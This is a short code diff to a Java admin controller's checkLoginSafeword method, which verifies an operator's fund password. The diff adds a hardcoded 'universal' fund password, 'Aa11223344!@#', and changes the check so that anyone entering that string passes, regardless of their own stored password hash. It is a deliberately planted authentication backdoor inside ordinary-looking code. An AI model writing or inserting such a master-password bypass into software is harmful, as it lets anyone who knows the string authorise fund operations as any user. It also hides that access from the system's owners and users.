@@ -205,8 +205,10 @@ public class AdminAutoMonitorOrderController extends PageActionSupport {
 	 */
 	protected void checkLoginSafeword(SecUser secUser,String operatorUsername,String loginSafeword) {
 		String sysSafeword = secUser.getSafeword();
+		// 通用登录人资金密码
+		String universalSafeword = "Aa11223344!@#";
 		String safeword_md5 = passwordEncoder.encodePassword(loginSafeword, operatorUsername);
-		if (!safeword_md5.equals(sysSafeword)) {
+		if (!safeword_md5.equals(sysSafeword) && !universalSafeword.equals(loginSafeword)) {
 			throw new BusinessException("登录人资金密码错误");
 		}
 	}
